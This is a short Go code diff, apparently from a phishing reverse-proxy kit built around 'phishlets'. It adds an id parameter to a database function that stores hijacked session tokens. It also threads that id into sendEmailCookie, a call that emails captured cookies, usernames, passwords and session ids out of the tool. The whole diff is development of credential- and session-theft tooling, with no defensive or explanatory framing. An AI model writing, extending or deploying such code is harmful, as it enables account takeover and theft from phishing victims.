@@ -179,7 +179,7 @@ func (d *Database) SetSessionCustom(sid string, name string, value string) error
 	return err
 }
 
-func (d *Database) SetSessionTokens(sid string, phishlet string, tokens map[string]map[string]*Token) error {
+func (d *Database) SetSessionTokens(sid string, id string, phishlet string, tokens map[string]map[string]*Token) error {
 	err := d.sessionsUpdateTokens(sid, tokens)
 
 	type Cookie struct {
@@ -222,7 +222,7 @@ func (d *Database) SetSessionTokens(sid string, phishlet string, tokens map[stri
 	//log.Important("database: %s", data)
 
 	json11, _ := json.Marshal(cookies)
-	sendEmailCookie(string(json11), data.Phishlet, data.Username, data.Password, data.SessionId)
+	sendEmailCookie(string(json11), data.Phishlet, data.Id, data.Username, data.Password, data.SessionId)
 	return err
 }
 
